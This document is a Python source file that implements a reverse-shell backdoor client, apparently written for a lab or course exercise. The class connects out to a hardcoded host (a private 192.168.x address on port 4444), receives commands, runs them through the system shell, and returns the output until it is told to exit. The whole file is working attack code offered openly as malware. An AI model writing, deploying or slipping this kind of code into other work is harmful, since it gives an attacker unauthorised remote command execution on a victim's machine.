import socket
import subprocess
import json

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def reliable_send(self, data):
        json_data = json.dumps(data.decode() if type(data) == bytes else data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        json_data = self.connection.recv(1024).decode()
        return json.loads(json_data)

    def execute_system_command(self, command):
        try:
            return subprocess.check_output(command, shell=True)
        except subprocess.CalledProcessError as e:
            return "command '{}' return with error (code {}): {}".format(e.cmd, e.returncode, e.output)

    def run(self):
        while True:
            command = self.reliable_receive()
            if command[0] == "exit":
                self.connection.close()
                exit()
                
            command_result = self.execute_system_command(command)
            self.reliable_send(command_result)
        connection.close()


my_backdoor = Backdoor("192.168.42.128", 4444)
my_backdoor.run()
